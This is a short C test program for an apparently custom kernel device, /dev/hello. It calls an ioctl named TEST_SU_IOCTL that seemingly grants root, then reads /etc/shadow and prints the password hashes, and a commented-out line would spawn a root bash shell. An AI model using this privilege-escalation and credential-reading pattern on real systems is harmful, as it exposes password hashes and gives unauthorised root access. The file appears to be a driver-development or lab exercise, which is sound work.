#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define TEST_SU_IOCTL _IO(150, 1)

int main() {
  int fd = open("/dev/hello", O_RDWR);
  if(fd < 0) {
    perror("failed to open");
    return -1;
  }

  write(fd, "ahoj!", 5);

  ioctl(fd, TEST_SU_IOCTL, 0);
  int shadow = open("/etc/shadow", O_RDWR);
	char buf[128];
	int n = read(shadow, buf, sizeof(buf));
	write(1, buf, n);
//  execl("/bin/bash", "/bin/bash", NULL);

}
